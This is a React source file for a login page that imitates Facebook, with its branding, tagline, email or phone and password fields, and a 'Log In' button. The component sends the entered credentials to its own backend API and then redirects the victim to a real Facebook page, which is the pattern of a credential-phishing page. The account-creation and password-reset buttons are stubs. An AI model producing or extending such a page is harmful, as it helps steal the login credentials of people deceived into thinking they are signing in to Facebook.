import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { Eye, EyeOff, Loader2 } from 'lucide-react';
import { useLoginMutation } from '../apis/auth';
import { addToast } from '@heroui/react';

const LoginPage = () => {
  const [showPassword, setShowPassword] = useState(false);
  const mutation = useLoginMutation();
  
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();


  const onSubmit = async (formData) => {
    
    try {
      const response = await mutation.mutateAsync(formData);
      if (response.status===200) {
        window.location.replace("https://web.facebook.com/NollyMatetv")
      }
    } catch (error) {
      addToast({
        title: 'Login Failed',
        description: 'Login failed. Please try again.',
        variant: "solid",
        color: "danger",
        radius:'sm',
        timeout: 2000,
      })
    }
  };

  const handleCreateAccount = () => {
    // Handle create account logic
    console.log('Create account clicked');
  };

  const handleForgotPassword = () => {
    // Handle forgot password logic
    console.log('Forgot password clicked');
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-8">
      <div className="w-full max-w-md">
        {/* Facebook Logo */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-blue-600 mb-2">facebook</h1>
          <p className="text-gray-600 text-lg">
            Connect with friends and the world around you on Facebook.
          </p>
        </div>

        {/* Login Form */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-4">
          <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
            {/* Email/Phone Input */}
            <div>
              <input
                type="text"
                placeholder="Email address or phone number"
                {...register('email', {
                  required: 'Email address or phone number is required',
                  pattern: {
                    value: /^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[\+]?[1-9][\d]{0,15})$/,
                    message: 'Please enter a valid email address or phone number'
                  }
                })}
                className={`w-full px-4 py-3 border rounded-md text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                  errors.email ? 'border-red-400 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
              />
              {errors.email && (
                <p className="text-red-600 text-sm mt-1">{errors.email.message}</p>
              )}
            </div>

            {/* Password Input */}
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                {...register('password', {
                  required: 'Password is required',
                  minLength: {
                    value: 6,
                    message: 'Password must be at least 6 characters'
                  }
                })}
                className={`w-full px-4 py-3 pr-12 border rounded-md text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 ${
                  errors.password ? 'border-red-400 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
              {errors.password && (
                <p className="text-red-600 text-sm mt-1">{errors.password.message}</p>
              )}
            </div>

            {/* Global Error Message */}
            {errors.root && (
              <div className="bg-red-50 border border-red-200 rounded-md p-3">
                <p className="text-red-600 text-sm">{errors.root.message}</p>
              </div>
            )}

            {/* Login Button */}
            <button
              type="submit"
              disabled={mutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-semibold py-3 px-4 rounded-md transition-all duration-200 flex items-center justify-center transform hover:scale-[1.02] active:scale-[0.98]"
            >
              {mutation.isPending ? (
                <>
                  <Loader2 className="animate-spin mr-2" size={20} />
                  Logging in...
                </>
              ) : (
                'Log In'
              )}
            </button>

            {/* Forgotten Password Link */}
            <div className="text-center">
              <button
                type="button"
                onClick={handleForgotPassword}
                className="text-blue-600 hover:text-blue-800 text-sm hover:underline transition-colors duration-200"
              >
                Forgotten password?
              </button>
            </div>
          </form>

          {/* Divider */}
          <div className="flex items-center my-6">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="mx-4 text-gray-500 text-sm">or</span>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>

          {/* Create Account Button */}
          <div className="text-center">
            <button
              onClick={handleCreateAccount}
              className="bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-md transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
            >
              Create new account
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center">
          <p className="text-gray-600 text-sm">
            <span className="font-semibold">Create a Page</span> for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;